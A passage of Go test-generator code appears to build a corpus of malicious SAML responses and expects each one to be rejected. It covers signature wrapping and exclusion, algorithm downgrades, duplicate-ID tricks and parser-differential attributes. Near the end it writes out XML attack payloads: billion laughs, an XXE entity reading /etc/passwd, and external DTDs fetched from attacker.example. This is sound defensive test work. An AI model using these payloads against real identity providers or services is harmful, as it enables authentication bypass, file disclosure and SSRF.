			expect: rejected("ErrInvalidAssertion", "a Subject needs exactly one NameID"),
		},
	}
}

func (g *corpusGen) idSpecs() []corpusSpec {
	id := func(name, attack string, edit func(r *etree.Element), detail string) corpusSpec {
		return corpusSpec{
			id: "ids/" + name, attack: attack, refs: []string{refIDs, refXSW},
			build:  func() []byte { return g.xml("acme", compact(respOpts{after: edit})) },
			expect: rejected("ErrMalformedResponse", detail),
		}
	}

	return []corpusSpec{
		id("response-and-assertion-share-an-id", "Response and Assertion share an ID",
			func(r *etree.Element) { r.CreateAttr("ID", assertionID) }, duplicateID),
		id("status-carries-the-assertion-id", "an ID on Status equal to the assertion ID",
			func(r *etree.Element) { child(r, "Status").CreateAttr("ID", assertionID) }, duplicateID),
		id("id-attribute-collision", "an Id attribute equal to the assertion ID",
			func(r *etree.Element) { child(r, "Status").CreateAttr("Id", assertionID) }, duplicateID),
		id("xml-id-collision", "an xml:id equal to the assertion ID",
			func(r *etree.Element) { child(r, "Status").CreateAttr("xml:id", assertionID) }, duplicateID),
		id("prefixed-id-attribute", "a lone prefixed ID attribute (etree and encoding/xml would disagree)",
			func(r *etree.Element) {
				st := child(r, "Status")
				st.CreateAttr("xmlns:evil", "urn:evil:attacker.example")
				st.CreateAttr("evil:ID", "_evil-prefixed")
			}, "prefixed ID attribute"),
	}
}

func (g *corpusGen) substitutionSpecs() []corpusSpec {
	refs := []string{"SAML Profiles §4.1.4.5", refOWASP}

	return []corpusSpec{
		{
			id: "substitution/signature-removed", attack: "signature exclusion: the assertion signature removed", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					a := child(r, "Assertion")
					a.RemoveChild(child(a, "Signature"))
				}}))
			},
			expect: rejected("ErrInvalidSignature", "neither the Response nor the Assertion is signed"),
		},
		{
			id: "substitution/unsigned-forged-assertion", attack: "unsigned forged assertion in an unsigned Response", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{unsignedAssert: true, after: func(r *etree.Element) { setNameID(evilNameID)(child(r, "Assertion")) }}))
			},
			expect: rejected("ErrInvalidSignature", "neither the Response nor the Assertion is signed"),
		},
		{
			id: "substitution/signed-response-assertion-swapped", attack: "signed Response whose assertion is swapped for an unsigned forged one",
			refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{unsignedAssert: true, signResponse: true, after: func(r *etree.Element) {
					a := child(r, "Assertion")
					idx := a.Index()
					r.RemoveChild(a)
					f := forged(assertionID)
					stripAttributes(f)
					r.InsertChildAt(idx, f)
				}}))
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "substitution/nameid-tampered", attack: "NameID changed after signing", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) { setNameID(evilNameID)(child(r, "Assertion")) }}))
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "substitution/attribute-tampered", attack: "attribute value changed after signing", refs: refs,
			build: func() []byte {
				return g.xml("acme", respOpts{after: func(r *etree.Element) {
					path(r, "Assertion", "AttributeStatement", "Attribute", "AttributeValue").SetText(evilNameID)
				}})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "substitution/cross-idp-transplant", attack: "globex's IdP-signed assertion transplanted into acme's Response", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{assertionSig: sigOpts{signer: g.keys["idp-b"]}, beforeAssertion: func(a *etree.Element) {
					child(a, "Issuer").SetText(g.conns["globex"].IdPEntityID)
				}}))
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
	}
}

func (g *corpusGen) algorithmSpecs() []corpusSpec {
	refs := []string{refDSig, refPolicy, "SAML errata E81"}
	setAlgorithm := func(tag, alg string) func(sig *etree.Element) {
		return func(sig *etree.Element) { path(sig, "SignedInfo").FindElement(".//"+tag).CreateAttr("Algorithm", alg) }
	}
	resigned := func(id, attack string, edit func(sig *etree.Element), sentinel, detail string, knobs corpusKnobs) corpusSpec {
		return corpusSpec{
			id: id, attack: attack, refs: refs, knobs: knobs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{before: g.resignAssertion(edit, crypto.SHA256)}))
			},
			expect: rejected(sentinel, detail),
		}
	}
	signedWith := func(id, attack string, sig sigOpts, knobs corpusKnobs) corpusSpec {
		return corpusSpec{
			id: id, attack: attack, refs: refs, knobs: knobs,
			build:  func() []byte { return g.xml("acme", compact(respOpts{assertionSig: sig})) },
			expect: rejected("ErrUnsupportedAlgorithm", ""),
		}
	}
	ec := corpusKnobs{Trust: []string{"idp-ec"}}

	return []corpusSpec{
		signedWith("algorithms/rsa-sha1", "valid rsa-sha1 signature, no opt-in", sigOpts{method: dsig.RSASHA1SignatureMethod}, corpusKnobs{}),
		signedWith("algorithms/ecdsa-sha1", "valid ecdsa-sha1 signature, no opt-in",
			sigOpts{signer: g.keys["idp-ec"], method: dsig.ECDSASHA1SignatureMethod}, ec),
		signedWith("algorithms/inclusive-c14n-1.0", "valid inclusive C14N 1.0 signature, even with the SHA-1 opt-in",
			sigOpts{canon: dsig.MakeC14N10RecCanonicalizer()}, corpusKnobs{AllowSHA1: true}),
		signedWith("algorithms/inclusive-c14n-1.1", "valid inclusive C14N 1.1 signature", sigOpts{canon: dsig.MakeC14N11Canonicalizer()}, corpusKnobs{}),
		signedWith("algorithms/inclusive-c14n-with-comments", "valid inclusive C14N 1.0 with comments signature, with the SHA-1 opt-in",
			sigOpts{canon: dsig.MakeC14N10WithCommentsCanonicalizer()}, corpusKnobs{AllowSHA1: true}),
		{
			id: "algorithms/sha1-digest-under-rsa-sha256", attack: "real SHA-1 digest under an rsa-sha256 SignedInfo signature", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{
					assertionSig: sigOpts{method: dsig.RSASHA1SignatureMethod},
					before:       g.resignAssertion(setAlgorithm("SignatureMethod", dsig.RSASHA256SignatureMethod), crypto.SHA256),
				}))
			},
			expect: rejected("ErrUnsupportedAlgorithm", ""),
		},
		{
			id: "algorithms/rsa-sha1-method-over-sha256-digest", attack: "rsa-sha1 SignatureMethod over a SHA-256 digest (re-signed), no opt-in",
			refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{
					before: g.resignAssertion(setAlgorithm("SignatureMethod", dsig.RSASHA1SignatureMethod), crypto.SHA1),
				}))
			},
			expect: rejected("ErrUnsupportedAlgorithm", ""),
		},
		{
			id: "algorithms/sha1-response-next-to-sha256-assertion", attack: "rsa-sha1 Response signature next to an rsa-sha256 assertion signature",
			refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{signResponse: true, responseSig: sigOpts{method: dsig.RSASHA1SignatureMethod}}))
			},
			expect: rejected("ErrUnsupportedAlgorithm", ""),
		},
		resigned("algorithms/md5-digest", "md5 DigestMethod", setAlgorithm("DigestMethod", "http://www.w3.org/2001/04/xmldsig-more#md5"),
			"ErrUnsupportedAlgorithm", "", corpusKnobs{}),
		resigned("algorithms/sha224-digest", "sha224 DigestMethod", setAlgorithm("DigestMethod", "http://www.w3.org/2001/04/xmldsig-more#sha224"),
			"ErrUnsupportedAlgorithm", "", corpusKnobs{}),
		resigned("algorithms/rsa-sha224", "rsa-sha224 SignatureMethod", setAlgorithm("SignatureMethod", "http://www.w3.org/2001/04/xmldsig-more#rsa-sha224"),
			"ErrUnsupportedAlgorithm", "", corpusKnobs{}),
		resigned("algorithms/hmac-sha256", "hmac-sha256 SignatureMethod (key confusion)", setAlgorithm("SignatureMethod", "http://www.w3.org/2001/04/xmldsig-more#hmac-sha256"),
			"ErrUnsupportedAlgorithm", "", corpusKnobs{}),
		resigned("algorithms/dsa-sha1", "dsa-sha1 SignatureMethod, even with the SHA-1 opt-in", setAlgorithm("SignatureMethod", "http://www.w3.org/2000/09/xmldsig#dsa-sha1"),
			"ErrUnsupportedAlgorithm", "", corpusKnobs{AllowSHA1: true}),
		resigned("algorithms/rsa-pss-mgf1", "RSASSA-PSS (sha256-rsa-MGF1) SignatureMethod", setAlgorithm("SignatureMethod", "http://www.w3.org/2007/05/xmldsig-more#sha256-rsa-MGF1"),
			"ErrUnsupportedAlgorithm", "", corpusKnobs{}),
		resigned("algorithms/unknown-signature-method", "unknown SignatureMethod", setAlgorithm("SignatureMethod", "urn:evil:attacker.example:none"),
			"ErrUnsupportedAlgorithm", "", corpusKnobs{}),
		resigned("algorithms/exc-c14n-trailing-space", "exclusive C14N URI with a trailing space", setAlgorithm("CanonicalizationMethod", algExcWithSpace),
			"ErrUnsupportedAlgorithm", "", corpusKnobs{}),
		resigned("algorithms/xslt-canonicalization-transform", "XSLT in place of the exclusive C14N transform",
			func(sig *etree.Element) {
				path(sig, "SignedInfo", "Reference", "Transforms").ChildElements()[1].CreateAttr("Algorithm", "http://www.w3.org/TR/1999/REC-xslt-19991116")
			}, "ErrUnsupportedAlgorithm", "", corpusKnobs{}),
		resigned("algorithms/extra-xpath-transform", "a third (XPath) transform",
			func(sig *etree.Element) {
				path(sig, "SignedInfo", "Reference", "Transforms").CreateElement("ds:Transform").
					CreateAttr("Algorithm", "http://www.w3.org/TR/1999/REC-xpath-19991116")
			}, "ErrInvalidSignature", transformRule, corpusKnobs{}),
		resigned("algorithms/enveloped-transform-only", "enveloped transform only (goxmldsig's non-standard Null canonicalizer)",
			func(sig *etree.Element) {
				tr := path(sig, "SignedInfo", "Reference", "Transforms")
				tr.RemoveChild(tr.ChildElements()[1])
			}, "ErrInvalidSignature", transformRule, corpusKnobs{}),
		resigned("algorithms/reversed-transforms", "transforms in reverse order",
			func(sig *etree.Element) {
				tr := path(sig, "SignedInfo", "Reference", "Transforms")
				first := tr.ChildElements()[0]
				tr.RemoveChild(first)
				tr.AddChild(first)
			}, "ErrInvalidSignature", transformRule, corpusKnobs{}),
		{
			id: "algorithms/comment-injected-under-with-comments", attack: "comment injected in the NameID under exc-c14n#WithComments (signed content)",
			refs: append(refs, "CVE-2017-11427"),
			build: func() []byte {
				return g.xml("acme", compact(respOpts{assertionSig: sigOpts{canon: exclusiveWithComments()}, raw: func(s string) string {
					return strings.Replace(s, ">"+nameIDValue+"<", ">alice-pair<!-- _evil -->wise-0001<", 1)
				}}))
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
	}
}

func (g *corpusGen) signatureSpecs() []corpusSpec {
	refs := []string{refDSig, "#87 code review F6 (validly re-signed shapes)"}
	ref := func(sig *etree.Element) *etree.Element { return path(sig, "SignedInfo", "Reference") }
	transforms := func(sig *etree.Element) *etree.Element { return path(ref(sig), "Transforms") }
	shape := func(id, attack string, edit func(sig *etree.Element), detail string) corpusSpec {
		return corpusSpec{
			id: "signature/" + id, attack: attack, refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{before: g.resignAssertion(edit, crypto.SHA256)}))
			},
			expect: rejected("ErrInvalidSignature", detail),
		}
	}

	return []corpusSpec{
		shape("reference-uri-empty", "Reference URI=\"\" (whole document)", func(sig *etree.Element) { ref(sig).CreateAttr("URI", "") }, notReferenced),
		shape("reference-uri-without-hash", "Reference URI without #", func(sig *etree.Element) { ref(sig).CreateAttr("URI", assertionID) }, notReferenced),
		shape("reference-uri-xpointer", "Reference URI #xpointer(id(...))",
			func(sig *etree.Element) { ref(sig).CreateAttr("URI", "#xpointer(id('"+assertionID+"'))") }, notReferenced),
		shape("reference-to-the-response", "assertion signature referencing the Response ID",
			func(sig *etree.Element) { ref(sig).CreateAttr("URI", "#"+responseID) }, notReferenced),
		shape("reference-without-uri", "Reference without URI", func(sig *etree.Element) { ref(sig).RemoveAttr("URI") }, notReferenced),
		shape("two-references", "two References (Core §5.4.2)",
			func(sig *etree.Element) { path(sig, "SignedInfo").AddChild(ref(sig).Copy()) }, signatureShape),
		shape("ds-object", "ds:Object inside the signature (errata E91)",
			func(sig *etree.Element) { sig.CreateElement("ds:Object").CreateElement("payload").SetText(evilNameID) }, signatureShape),
		shape("hmac-output-length", "HMACOutputLength under SignatureMethod",
			func(sig *etree.Element) {
				path(sig, "SignedInfo", "SignatureMethod").CreateElement("ds:HMACOutputLength").SetText("8")
			}, signatureShape),
		shape("unknown-signed-info-child", "a Manifest inside SignedInfo",
			func(sig *etree.Element) { path(sig, "SignedInfo").CreateElement("ds:Manifest") }, signatureShape),
		shape("canonicalization-method-child", "a foreign child of CanonicalizationMethod (#87 R4)",
			func(sig *etree.Element) {
				el := path(sig, "SignedInfo", "CanonicalizationMethod").CreateElement("x:Extra")
				el.CreateAttr("xmlns:x", "urn:evil:attacker.example")
			}, signatureShape),
		shape("enveloped-transform-child", "a child of the enveloped-signature transform (#87 R5)",
			func(sig *etree.Element) { transforms(sig).ChildElements()[0].CreateElement("ds:XPath") }, transformRule),
		shape("digest-value-child", "a child of DigestValue (#87 R7)",
			func(sig *etree.Element) { path(ref(sig), "DigestValue").CreateElement("ds:X") }, signatureShape),
		shape("digest-method-child", "a child of DigestMethod (#87 R8)",
			func(sig *etree.Element) { path(ref(sig), "DigestMethod").CreateElement("ds:X") }, signatureShape),
		shape("two-inclusive-namespaces", "two InclusiveNamespaces (#87 R11)",
			func(sig *etree.Element) {
				tr := transforms(sig).ChildElements()[1]
				for i := 0; i < 2; i++ {
					inc := tr.CreateElement("ec:InclusiveNamespaces")
					inc.CreateAttr("xmlns:ec", "http://www.w3.org/2001/10/xml-exc-c14n#")
				}
			}, signatureShape),
		shape("too-many-inclusive-prefixes", "an InclusiveNamespaces PrefixList of 33 prefixes",
			func(sig *etree.Element) {
				inc := transforms(sig).ChildElements()[1].CreateElement("ec:InclusiveNamespaces")
				inc.CreateAttr("xmlns:ec", "http://www.w3.org/2001/10/xml-exc-c14n#")
				inc.CreateAttr("PrefixList", strings.TrimSpace(strings.Repeat("p ", 33)))
			}, "too many inclusive namespace prefixes"),
		shape("transform-in-foreign-namespace", "a Transform in a foreign namespace",
			func(sig *etree.Element) {
				tr := transforms(sig)
				first := tr.ChildElements()[0]
				first.Space = "x"
				first.CreateAttr("xmlns:x", "urn:evil:attacker.example")
			}, signatureShape),
		shape("foreign-element-in-reference", "a foreign element inside the Reference",
			func(sig *etree.Element) {
				el := ref(sig).CreateElement("x:Note")
				el.CreateAttr("xmlns:x", "urn:evil:attacker.example")
			}, signatureShape),
		shape("missing-canonicalization-method", "SignedInfo without CanonicalizationMethod",
			func(sig *etree.Element) {
				si := path(sig, "SignedInfo")
				si.RemoveChild(path(si, "CanonicalizationMethod"))
			}, signatureShape),
		shape("two-signature-methods", "two SignatureMethods",
			func(sig *etree.Element) {
				si := path(sig, "SignedInfo")
				si.AddChild(path(si, "SignatureMethod").Copy())
			}, signatureShape),
		{
			id: "signature/signature-value-child", attack: "a child element in SignatureValue (#87 R6)", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					path(r, "Assertion", "Signature", "SignatureValue").CreateElement("ds:X")
				}}))
			},
			expect: rejected("ErrInvalidSignature", signatureShape),
		},
		{
			id: "signature/missing-signature-value", attack: "Signature without SignatureValue", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					sig := path(r, "Assertion", "Signature")
					sig.RemoveChild(path(sig, "SignatureValue"))
				}}))
			},
			expect: rejected("ErrInvalidSignature", signatureShape),
		},
		{
			id: "signature/two-key-infos", attack: "two KeyInfo elements", refs: refs,
			build: func() []byte {
				return g.xml("acme", respOpts{after: func(r *etree.Element) {
					sig := path(r, "Assertion", "Signature")
					sig.AddChild(path(sig, "KeyInfo").Copy())
				}})
			},
			expect: rejected("ErrInvalidSignature", signatureShape),
		},
	}
}

func (g *corpusGen) differentialSpecs() []corpusSpec {
	refs := []string{refCR87, "XML 1.0 §3.1 WFC Unique Att Spec", "Namespaces in XML §6.3"}

	// SignedInfo attributes goxmldsig decodes (last match after exc-c14n
	// sorting) while a first-match reader would see the other value.
	signedInfo := []struct {
		name string
		find func(sig *etree.Element) *etree.Element
		attr string
		evil string
	}{
		{"signature-method", func(sig *etree.Element) *etree.Element { return path(sig, "SignedInfo", "SignatureMethod") },
			"Algorithm", dsig.RSASHA1SignatureMethod},
		{"digest-method", func(sig *etree.Element) *etree.Element { return path(sig, "SignedInfo", "Reference", "DigestMethod") },
			"Algorithm", "http://www.w3.org/2000/09/xmldsig#sha1"},
		{"canonicalization-method", func(sig *etree.Element) *etree.Element { return path(sig, "SignedInfo", "CanonicalizationMethod") },
			"Algorithm", "http://www.w3.org/TR/2001/REC-xml-c14n-20010315"},
		{"c14n-transform", func(sig *etree.Element) *etree.Element {
			return path(sig, "SignedInfo", "Reference", "Transforms").ChildElements()[1]
		}, "Algorithm", "http://www.w3.org/TR/2001/REC-xml-c14n-20010315"},
		{"reference-uri", func(sig *etree.Element) *etree.Element { return path(sig, "SignedInfo", "Reference") },
			"URI", "#_evil-other-element"},
	}

	// Assertion attributes gosaml2 decodes with encoding/xml (local names).
	assertion := []struct {
		name string
		find func(a *etree.Element) *etree.Element
		attr string
		evil string
	}{
		{"assertion-id", func(a *etree.Element) *etree.Element { return a }, "ID", "_evil-assertion"},
		{"assertion-version", func(a *etree.Element) *etree.Element { return a }, "Version", "1.1"},
		{"assertion-issue-instant", func(a *etree.Element) *etree.Element { return a }, "IssueInstant", ts(-time.Hour)},
		{"scd-in-response-to", scd, "InResponseTo", "_evil-request"},
		{"scd-recipient", scd, "Recipient", evilACS},
		{"scd-not-on-or-after", scd, "NotOnOrAfter", ts(24 * time.Hour)},
		{"confirmation-method", func(a *etree.Element) *etree.Element { return path(a, "Subject", "SubjectConfirmation") },
			"Method", "urn:oasis:names:tc:SAML:2.0:cm:sender-vouches"},
		{"nameid-format", func(a *etree.Element) *etree.Element { return path(a, "Subject", "NameID") },
			"Format", samlsp.NameIDFormatTransient},
		{"conditions-not-before", func(a *etree.Element) *etree.Element { return child(a, "Conditions") }, "NotBefore", ts(-24 * time.Hour)},
		{"conditions-not-on-or-after", func(a *etree.Element) *etree.Element { return child(a, "Conditions") },
			"NotOnOrAfter", ts(24 * time.Hour)},
		{"authn-instant", func(a *etree.Element) *etree.Element { return child(a, "AuthnStatement") }, "AuthnInstant", ts(-24 * time.Hour)},
		{"session-index", func(a *etree.Element) *etree.Element { return child(a, "AuthnStatement") }, "SessionIndex", "_evil-session"},
		{"session-not-on-or-after", func(a *etree.Element) *etree.Element { return child(a, "AuthnStatement") },
			"SessionNotOnOrAfter", ts(30 * 24 * time.Hour)},
		{"issuer-format", func(a *etree.Element) *etree.Element { return child(a, "Issuer") },
			"Format", samlsp.NameIDFormatTransient},
		{"nameid-name-qualifier", func(a *etree.Element) *etree.Element { return path(a, "Subject", "NameID") },
			"NameQualifier", evilIssuer},
		{"nameid-sp-name-qualifier", func(a *etree.Element) *etree.Element { return path(a, "Subject", "NameID") },
			"SPNameQualifier", "https://sp.attacker.example"},
	}

	// Response attributes (unsigned envelope).
	response := []struct {
		name string
		find func(r *etree.Element) *etree.Element
		attr string
		evil string
	}{
		{"response-destination", func(r *etree.Element) *etree.Element { return r }, "Destination", evilACS},
		{"response-in-response-to", func(r *etree.Element) *etree.Element { return r }, "InResponseTo", "_evil-request"},
		{"response-version", func(r *etree.Element) *etree.Element { return r }, "Version", "1.1"},
		{"status-code-value", func(r *etree.Element) *etree.Element { return path(r, "Status", "StatusCode") }, "Value", requesterCode},
	}

	var specs []corpusSpec

	for _, order := range []struct {
		suffix        string
		prefixedFirst bool
	}{{"unprefixed-first", false}, {"prefixed-first", true}} {
		for _, d := range signedInfo {
			specs = append(specs, corpusSpec{
				id:     fmt.Sprintf("differential/%s-%s", d.name, order.suffix),
				attack: fmt.Sprintf("SignedInfo %s duplicated as evil:%s (validly re-signed)", d.attr, d.attr), refs: refs,
				build: func() []byte {
					return g.xml("acme", compact(respOpts{before: g.resignAssertion(func(sig *etree.Element) {
						dupAttr(d.attr, d.evil, order.prefixedFirst)(d.find(sig))
					}, crypto.SHA256)}))
				},
				expect: rejected("ErrMalformedResponse", twoLocalNames),
			})
		}

		for _, d := range assertion {
			specs = append(specs, corpusSpec{
				id:     fmt.Sprintf("differential/%s-%s", d.name, order.suffix),
				attack: fmt.Sprintf("signed assertion attribute %s duplicated as evil:%s", d.attr, d.attr), refs: refs,
				build: func() []byte {
					return g.xml("acme", compact(onAssertion(func(a *etree.Element) {
						dupAttr(d.attr, d.evil, order.prefixedFirst)(d.find(a))
					})))
				},
				expect: rejected("ErrMalformedResponse", twoLocalNames),
			})
		}

		for _, d := range response {
			specs = append(specs, corpusSpec{
				id:     fmt.Sprintf("differential/%s-%s", d.name, order.suffix),
				attack: fmt.Sprintf("Response attribute %s duplicated as evil:%s", d.attr, d.attr), refs: refs,
				build: func() []byte {
					return g.xml("acme", compact(onResponse(func(r *etree.Element) {
						dupAttr(d.attr, d.evil, order.prefixedFirst)(d.find(r))
					})))
				},
				expect: rejected("ErrMalformedResponse", twoLocalNames),
			})
		}
	}

	// Every SAML and XML-DSig attribute name, prefixed and alone on the
	// Status, which carries no attribute: only the prefixed-name rule
	// refuses it (the gate refuses a prefixed ID first).
	for _, name := range []string{
		"Address", "Algorithm", "Consent", "Count", "DNSName", "Decision", "Destination", "Format",
		"FriendlyName", "ID", "Id", "InResponseTo", "IssueInstant", "Method", "Name", "NameFormat",
		"NameQualifier", "Namespace", "NotBefore", "NotOnOrAfter", "PrefixList", "Recipient", "Resource",
		"SPNameQualifier", "SPProvidedID", "SessionIndex", "SessionNotOnOrAfter", "Type", "URI", "Value",
		"Version", "AuthnInstant",
	} {
		detail := prefixedSAML
		if name == "ID" || name == "Id" {
			detail = "prefixed ID attribute"
		}

		suffix := kebab(name)
		if name == "Id" {
			suffix = "xmldsig-id" // ID and Id differ by case only
		}

		specs = append(specs, corpusSpec{
			id:     "differential/lone-prefixed-on-status-" + suffix,
			attack: fmt.Sprintf("evil:%s alone on the Status (unsigned envelope)", name), refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(onResponse(func(r *etree.Element) {
					st := child(r, "Status")
					st.CreateAttr("xmlns:evil", "urn:evil:attacker.example")
					st.CreateAttr("evil:"+name, "_evil")
				})))
			},
			expect: rejected("ErrMalformedResponse", detail),
		})
	}

	return append(specs,
		corpusSpec{
			id:     "differential/sha1-digest-behind-prefixed-algorithm",
			attack: "#87 code review F3 reproduction: real SHA-1 digest, DigestMethod Algorithm=sha256 evil:Algorithm=sha1, re-signed",
			refs:   refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{
					assertionSig: sigOpts{method: dsig.RSASHA1SignatureMethod},
					before: g.resignAssertion(func(sig *etree.Element) {
						path(sig, "SignedInfo", "SignatureMethod").CreateAttr("Algorithm", dsig.RSASHA256SignatureMethod)
						dm := path(sig, "SignedInfo", "Reference", "DigestMethod")
						dm.CreateAttr("Algorithm", "http://www.w3.org/2001/04/xmlenc#sha256")
						dupAttr("Algorithm", "http://www.w3.org/2000/09/xmldsig#sha1", false)(dm)
					}, crypto.SHA256),
				}))
			},
			expect: rejected("ErrMalformedResponse", twoLocalNames),
		},
		corpusSpec{
			id:     "differential/algorithm-namespace-declaration",
			attack: "xmlns:Algorithm declaration next to Algorithm (encoding/xml matches both by local name)",
			refs:   refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{before: g.resignAssertion(func(sig *etree.Element) {
					path(sig, "SignedInfo", "Reference", "DigestMethod").CreateAttr("xmlns:Algorithm", "http://www.w3.org/2000/09/xmldsig#sha1")
				}, crypto.SHA256)}))
			},
			expect: rejected("ErrMalformedResponse", twoLocalNames),
		},
		corpusSpec{
			id: "differential/lone-prefixed-destination", attack: "evil:Destination without Destination on the Response", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(onResponse(func(r *etree.Element) {
					r.RemoveAttr("Destination")
					r.CreateAttr("xmlns:evil", "urn:evil:attacker.example")
					r.CreateAttr("evil:Destination", evilACS)
				})))
			},
			expect: rejected("ErrMalformedResponse", prefixedSAML),
		},
		corpusSpec{
			id:     "differential/lone-prefixed-version",
			attack: "evil:Version=\"2.0\" without Version: the pre-check reads unprefixed attributes only (refused as unversioned first)",
			refs:   refs,
			build: func() []byte {
				return g.xml("acme", compact(onResponse(func(r *etree.Element) {
					r.RemoveAttr("Version")
					r.CreateAttr("xmlns:evil", "urn:evil:attacker.example")
					r.CreateAttr("evil:Version", "2.0")
				})))
			},
			expect: rejected("ErrMalformedResponse", "unsupported SAML version"),
		},
		corpusSpec{
			id: "differential/lone-prefixed-recipient", attack: "evil:Recipient without Recipient in the signed bearer confirmation", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(onAssertion(func(a *etree.Element) {
					d := scd(a)
					d.RemoveAttr("Recipient")
					d.CreateAttr("xmlns:evil", "urn:evil:attacker.example")
					d.CreateAttr("evil:Recipient", acsURL)
				})))
			},
			expect: rejected("ErrMalformedResponse", prefixedSAML),
		},
		corpusSpec{
			id:     "differential/xml-not-before-on-bearer-confirmation",
			attack: "xml:NotBefore on the signed bearer SubjectConfirmationData: encoding/xml reads it as the NotBefore the profile forbids",
			refs:   append(refs, refXMLNamespace, "SAML Profiles §4.1.4.2"),
			build: func() []byte {
				return g.xml("acme", compact(onAssertion(func(a *etree.Element) {
					scd(a).CreateAttr("xml:NotBefore", ts(-time.Minute))
				})))
			},
			expect: rejected("ErrMalformedResponse", xmlAttribute),
		},
		corpusSpec{
			id:     "differential/xml-destination-on-signed-response",
			attack: "xml:Destination instead of Destination on a signed Response (Bindings §3.5.5.2 requires Destination)",
			refs:   append(refs, refXMLNamespace, "SAML Bindings §3.5.5.2"),
			build: func() []byte {
				return g.xml("acme", compact(respOpts{signResponse: true, before: func(r, _ *etree.Element) {
					r.RemoveAttr("Destination")
					r.CreateAttr("xml:Destination", acsURL)
				}}))
			},
			expect: rejected("ErrMalformedResponse", xmlAttribute),
		},
		corpusSpec{
			id:     "differential/xml-session-not-on-or-after",
			attack: "xml:SessionNotOnOrAfter with a time zone offset: escapes the UTC time-format rule",
			refs:   append(refs, refXMLNamespace, "SAML Core §1.3.3"),
			build: func() []byte {
				return g.xml("acme", compact(onAssertion(func(a *etree.Element) {
					st := child(a, "AuthnStatement")
					st.RemoveAttr("SessionNotOnOrAfter")
					st.CreateAttr("xml:SessionNotOnOrAfter", "2026-10-12T20:00:00+05:00")
				})))
			},
			expect: rejected("ErrMalformedResponse", xmlAttribute),
		},
		corpusSpec{
			id:     "differential/xml-undefined-attribute",
			attack: "an attribute of the reserved XML namespace that it does not define (xml:evil) on the Status",
			refs:   append(refs, refXMLNamespace),
			build: func() []byte {
				return g.xml("acme", compact(onResponse(func(r *etree.Element) {
					child(r, "Status").CreateAttr("xml:evil", "_evil")
				})))
			},
			expect: rejected("ErrMalformedResponse", xmlAttribute),
		},
		corpusSpec{
			id: "differential/lone-prefixed-algorithm", attack: "evil:Algorithm without Algorithm on DigestMethod (re-signed)", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{before: g.resignAssertion(func(sig *etree.Element) {
					dm := path(sig, "SignedInfo", "Reference", "DigestMethod")
					dm.RemoveAttr("Algorithm")
					dm.CreateAttr("xmlns:evil", "urn:evil:attacker.example")
					dm.CreateAttr("evil:Algorithm", "http://www.w3.org/2001/04/xmlenc#sha256")
				}, crypto.SHA256)}))
			},
			expect: rejected("ErrMalformedResponse", prefixedSAML),
		},
	)
}

func (g *corpusGen) xmlSpecs() []corpusSpec {
	refs := []string{refOWASP, "XML 1.0 well-formedness"}
	baseXML := func() string { return string(g.xml("acme", compact(respOpts{}))) }
	text := func(id, attack string, edit func(s string) string, detail string, sentinel string) corpusSpec {
		return corpusSpec{
			id: "xml/" + id, attack: attack, refs: refs,
			build:  func() []byte { return []byte(edit(baseXML())) },
			expect: rejected(sentinel, detail),
		}
	}
	insertOnRoot := func(attrs string) func(s string) string {
		return func(s string) string { return strings.Replace(s, "<samlp:Response ", "<samlp:Response "+attrs+" ", 1) }
	}
	// nsName replaces the unsigned envelope's Status start tag: a name
	// whose prefix or local part is empty is not namespace-well-formed
	// (Namespaces in XML 1.0 §3, §7), and encoding/xml keeps it whole in no
	// namespace (#88 code review F6).
	nsName := func(id, attack, statusTag string) corpusSpec {
		return corpusSpec{
			id: "xml/" + id, attack: attack, refs: []string{refNamespaces, "#88 code review F6"},
			build:  func() []byte { return []byte(strings.Replace(baseXML(), "<samlp:Status>", statusTag, 1)) },
			expect: rejected("ErrMalformedResponse", notNSWellFormed),
		}
	}

	return []corpusSpec{
		text("billion-laughs", "internal entity expansion (billion laughs)", func(s string) string {
			return `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;">]>` + s
		}, "DTD or directive", "ErrMalformedResponse"),
		text("xxe-file", "external entity on file:///etc/passwd (XXE)", func(s string) string {
			return `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>` + s
		}, "DTD or directive", "ErrMalformedResponse"),
		text("external-dtd", "external DTD over http (SSRF through the DTD)", func(s string) string {
			return `<!DOCTYPE samlp:Response SYSTEM "http://attacker.example/evil.dtd">` + s
		}, "DTD or directive", "ErrMalformedResponse"),
		text("parameter-entity", "parameter entity", func(s string) string {
			return `<!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.example/p.dtd"> %p;]>` + s
		}, "DTD or directive", "ErrMalformedResponse"),
		text("processing-instruction-after-root", "processing instruction after the root", func(s string) string { return s + `<?php ?>` },
			"processing instruction", "ErrMalformedResponse"),
		text("processing-instruction-in-nameid", "processing instruction inside the NameID", func(s string) string {
			return strings.Replace(s, ">"+nameIDValue+"<", "><?evil x?>"+nameIDValue+"<", 1)
		}, "processing instruction", "ErrMalformedResponse"),
